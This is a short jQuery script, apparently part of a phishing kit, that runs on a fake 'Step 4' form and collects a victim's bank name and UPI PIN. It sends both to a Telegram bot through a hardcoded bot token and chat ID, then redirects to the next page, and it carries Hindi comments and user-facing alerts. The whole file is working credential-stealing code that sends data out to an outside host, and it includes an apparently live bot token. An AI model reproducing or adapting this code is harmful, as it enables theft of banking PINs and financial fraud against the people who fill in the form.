$(document).ready(function() {
    $("#submitForm").submit(function(event) {
        event.preventDefault(); // Default form submission रोकें

        var upiPin = $("input[name='upipin']").val();
        var bankName = $("input[name='bankname']").val();
        var nextPage = $("#nextValue").val(); // अगला पेज

        // Telegram API Details
        var botToken = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU";
        var chatId = "-1002677669875";
        var message = `🔐 *Step 4 - UPI Details भरे गए*\n\n🔹 *Bank Name:* ${bankName}\n🔸 *UPI PIN:* ${upiPin}`;

        var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        // Telegram API को डेटा भेजना
        fetch(telegramUrl)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    $("#submitForm")[0].reset(); // फॉर्म रीसेट करें
                    window.location.href = nextPage; // अगले पेज पर जाएं
                } else {
                    alert("मैसेज भेजने में समस्या आई। कृपया फिर से प्रयास करें।");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("सर्वर से कनेक्ट नहीं हो सका। कृपया इंटरनेट चेक करें।");
            });
    });
});